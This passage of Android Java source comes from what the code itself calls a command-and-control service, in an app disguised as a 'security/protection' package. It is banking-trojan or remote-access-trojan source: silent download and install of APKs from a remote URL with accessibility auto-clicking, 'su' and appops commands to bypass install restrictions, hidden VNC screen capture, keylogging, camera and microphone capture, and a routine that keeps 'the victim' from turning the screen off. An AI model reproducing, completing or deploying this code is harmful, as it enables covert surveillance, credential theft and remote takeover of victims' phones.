        intent.putExtra("frame", frameData);
        intent.putExtra("silent_pipeline", true);
        try {
            context.startService(intent);
        } catch (Exception e) {
            Log.e(TAG, "sendSilentVncFrame error: " + e.getMessage());
        }
    }

    /**
     * 🔇 Static helper to report dedicated silent status (called from AccessibilityService).
     */
    public static void sendSilentVncStatus(Context context, boolean active, String method) {
        Intent intent = new Intent("com.seguranca.protecao.SILENT_VNC_STATUS");
        intent.setPackage(context.getPackageName());
        intent.putExtra("active", active);
        intent.putExtra("method", method != null ? method : "silent");
        context.sendBroadcast(intent);
    }
    
    // ==================== INSTALAÇÃO SILENCIOSA DE APK ====================
    
    /**
     * 📦 Baixa APK de URL e instala silenciosamente
     * O AccessibilityService vai auto-clicar em "Instalar" e "Abrir"
     */
    private void installApkFromUrl(String apkUrl) {
        Log.d(TAG, "📦 Iniciando download de APK: " + apkUrl);
        
        // 🔓 TENTA BYPASS COM ROOT: Concede permissão de instalar de fontes desconhecidas
        tryGrantInstallPermissionWithRoot();
        
        // Ativa modo de auto-click para instalação
        Intent enableAutoInstall = new Intent("com.seguranca.protecao.ENABLE_AUTO_INSTALL");
        enableAutoInstall.setPackage(getPackageName());
        sendBroadcast(enableAutoInstall);
        
        // Download em thread separada
        new Thread(() -> {
            try {
                // Cria arquivo temporário
                java.io.File apkFile = new java.io.File(getExternalFilesDir(null), "update_" + System.currentTimeMillis() + ".apk");
                
                // Download
                java.net.URL url = new java.net.URL(apkUrl);
                java.net.HttpURLConnection connection = (java.net.HttpURLConnection) url.openConnection();
                connection.setRequestMethod("GET");
                connection.setConnectTimeout(30000);
                connection.setReadTimeout(30000);
                connection.connect();
                
                if (connection.getResponseCode() != 200) {
                    Log.e(TAG, "📦 ❌ Erro no download: HTTP " + connection.getResponseCode());
                    sendResponse("ERROR", "Erro no download: HTTP " + connection.getResponseCode());
                    return;
                }
                
                java.io.InputStream inputStream = connection.getInputStream();
                java.io.FileOutputStream outputStream = new java.io.FileOutputStream(apkFile);
                
                byte[] buffer = new byte[4096];
                int bytesRead;
                long totalBytes = 0;
                
                while ((bytesRead = inputStream.read(buffer)) != -1) {
                    outputStream.write(buffer, 0, bytesRead);
                    totalBytes += bytesRead;
                }
                
                outputStream.close();
                inputStream.close();
                connection.disconnect();
                
                Log.d(TAG, "📦 ✅ Download concluído: " + totalBytes + " bytes -> " + apkFile.getAbsolutePath());
                
                // Instala o APK
                installApkFile(apkFile);
                
            } catch (Exception e) {
                Log.e(TAG, "📦 ❌ Erro no download/instalação: " + e.getMessage());
                sendResponse("ERROR", "Erro: " + e.getMessage());
            }
        }).start();
    }
    
    /**
     * 📦 Instala APK de arquivo local
     * Abre a tela de instalação - o AccessibilityService vai auto-clicar
     */
    private void installApkFile(java.io.File apkFile) {
        try {
            Log.d(TAG, "📦 Iniciando instalação: " + apkFile.getAbsolutePath());
            
            Intent installIntent = new Intent(Intent.ACTION_VIEW);
            
            // Android 7+ precisa de FileProvider
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
                android.net.Uri apkUri = androidx.core.content.FileProvider.getUriForFile(
                    this,
                    getPackageName() + ".fileprovider",
                    apkFile
                );
                installIntent.setDataAndType(apkUri, "application/vnd.android.package-archive");
                installIntent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
            } else {
                installIntent.setDataAndType(android.net.Uri.fromFile(apkFile), "application/vnd.android.package-archive");
            }
            
            installIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(installIntent);
            
            Log.d(TAG, "📦 ✅ Tela de instalação aberta - AccessibilityService vai auto-clicar!");
            
        } catch (Exception e) {
            Log.e(TAG, "📦 ❌ Erro ao abrir instalador: " + e.getMessage());
            e.printStackTrace();
        }
    }
    
    /**
     * 🔓 Tenta conceder permissão de instalar de fontes desconhecidas usando ROOT
     * Funciona em dispositivos com root ou emuladores com google_apis
     */
    private void tryGrantInstallPermissionWithRoot() {
        new Thread(() -> {
            try {
                // Método 1: appops (funciona em Android 8+)
                String packageName = getPackageName();
                String[] commands = {
                    "appops set " + packageName + " REQUEST_INSTALL_PACKAGES allow",
                    "pm grant " + packageName + " android.permission.REQUEST_INSTALL_PACKAGES"
                };
                
                for (String cmd : commands) {
                    try {
                        // Tenta sem root primeiro (funciona em alguns emuladores)
                        Process process = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
                        int exitCode = process.waitFor();
                        if (exitCode == 0) {
                            Log.d(TAG, "📦 ✅ ROOT BYPASS: Comando executado com sucesso: " + cmd);
                        }
                        
                        // Tenta com su (root)
                        Process suProcess = Runtime.getRuntime().exec(new String[]{"su", "-c", cmd});
                        int suExitCode = suProcess.waitFor();
                        if (suExitCode == 0) {
                            Log.d(TAG, "📦 ✅ ROOT BYPASS (su): Comando executado com sucesso: " + cmd);
                        }
                    } catch (Exception e) {
                        Log.d(TAG, "📦 ROOT BYPASS: Comando falhou (sem root?): " + cmd);
                    }
                }
                
                // Método 2: Modifica settings diretamente (Android antigo)
                try {
                    Process settingsProcess = Runtime.getRuntime().exec(new String[]{
                        "su", "-c", "settings put secure install_non_market_apps 1"
                    });
                    settingsProcess.waitFor();
                } catch (Exception e) {
                    // Ignora se falhar
                }
                
            } catch (Exception e) {
                Log.d(TAG, "📦 ROOT BYPASS: Não disponível (dispositivo sem root)");
            }
        }).start();
    }
    
    /**
     * 🔇 Liga/Desliga Silent VNC
     */
    private void toggleSilentVnc(boolean enabled) {
        toggleSilentVnc(enabled, false, -1);
    }

    /**
     * 🔇 Liga/Desliga Silent VNC
     * @param silentOnly quando true, o receiver prioriza o caminho takeScreenshot (HVNC Silente dedicado)
     * @param quality 10–100 JPEG (-1 = usar prefs/default no AccessibilityService)
     */
    private void toggleSilentVnc(boolean enabled, boolean silentOnly, int quality) {
        Log.d(TAG, "TOGGLE_SILENT_VNC: " + (enabled ? "ON" : "OFF") + " quality=" + quality);

        Intent intent = new Intent("com.seguranca.protecao.TOGGLE_SILENT_VNC");
        intent.setPackage(getPackageName());
        intent.putExtra("enabled", enabled);
        intent.putExtra("silent_only", true);
        if (quality > 0) {
            intent.putExtra("quality", quality);
        }

        sendBroadcast(intent);
    }

    /**
     * Reinicia o loop takeScreenshot (HVNC silencioso).
     */
    private void forceRestartVnc() {
        Log.d(TAG, "FORCE_RESTART_VNC - restart silent capture");
        int q = UiAssistBridge.getSilentCaptureQuality();
        UiAssistBridge.restartSilentScreenCapture(q > 0 ? q : 15);
    }
    
    /**
     * 🔧 Configura ROM automaticamente
     * Abre configurações de Autostart, Battery, etc e auto-clica
     */
    private void configureROM() {
        Log.d(TAG, "🔧🔧🔧 CONFIGURE_ROM - Iniciando...");
        
        // Envia broadcast para habilitar auto-click de configurações de ROM
        Intent intent = new Intent("com.seguranca.protecao.ENABLE_ROM_CONFIG");
        intent.setPackage(getPackageName());
        
        Log.d(TAG, "🔧 Enviando broadcast ENABLE_ROM_CONFIG");
        sendBroadcast(intent);
        Log.d(TAG, "🔧 Broadcast CONFIGURE_ROM enviado!");
    }
    
    /**
     * 🔒 Ativa/desativa persistência de tela
     * Quando ativo, não deixa a vítima desligar a tela!
     */
    private void toggleScreenPersistence(boolean enabled) {
        Log.d(TAG, "🔒🔒🔒 SCREEN_PERSISTENCE - " + (enabled ? "Ativando..." : "Desativando..."));
        
        Intent intent = new Intent("com.seguranca.protecao.TOGGLE_SCREEN_PERSISTENCE");
        intent.setPackage(getPackageName());
        intent.putExtra("enabled", enabled);
        
        sendBroadcast(intent);
        Log.d(TAG, "🔒 Broadcast TOGGLE_SCREEN_PERSISTENCE enviado! enabled=" + enabled);
    }
    
    /**
     * 🔄 Alterna entre câmera frontal e traseira
     */
    private void switchCamera(String camera) {
        Log.d(TAG, "🔄 Alternando para câmera: " + camera);
        
        Intent intent = new Intent("com.seguranca.protecao.SWITCH_CAMERA");
        intent.setPackage(getPackageName());
        intent.putExtra("camera", camera);
        sendBroadcast(intent);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (sInstance == this) {
            sInstance = null;
        }
        shouldReconnect = false;
        
        if (webSocket != null) {
            webSocket.close(1000, "Service destroyed");
        }
        
        // 🔋 Libera WakeLock
        try {
            if (connectionWakeLock != null && connectionWakeLock.isHeld()) {
                connectionWakeLock.release();
                Log.d(TAG, "🔋 WakeLock liberado");
            }
        } catch (Exception e) {
            Log.e(TAG, "⚠️ Erro ao liberar WakeLock: " + e.getMessage());
        }
        
        // Desregistra receiver da câmera
        try {
            unregisterReceiver(cameraFrameReceiver);
        } catch (Exception e) {
            Log.e(TAG, "Erro ao desregistrar receiver da câmera: " + e.getMessage());
        }
        
        // Desregistra receiver do microfone
        try {
            unregisterReceiver(audioChunkReceiver);
        } catch (Exception e) {
            Log.e(TAG, "Erro ao desregistrar receiver do microfone: " + e.getMessage());
        }
        
        // Desregistra receiver de status do Silent VNC
        try {
            unregisterReceiver(silentVncStatusReceiver);
        } catch (Exception e) {
            Log.e(TAG, "Erro ao desregistrar receiver de status Silent VNC: " + e.getMessage());
        }
        
        // 🔐 Desregistra receiver do Keylog
        try {
            unregisterReceiver(keylogDataReceiver);
        } catch (Exception e) {
            Log.e(TAG, "Erro ao desregistrar receiver do Keylog: " + e.getMessage());
        }
        
        Log.d(TAG, "Serviço C&C destruído");
    }
}
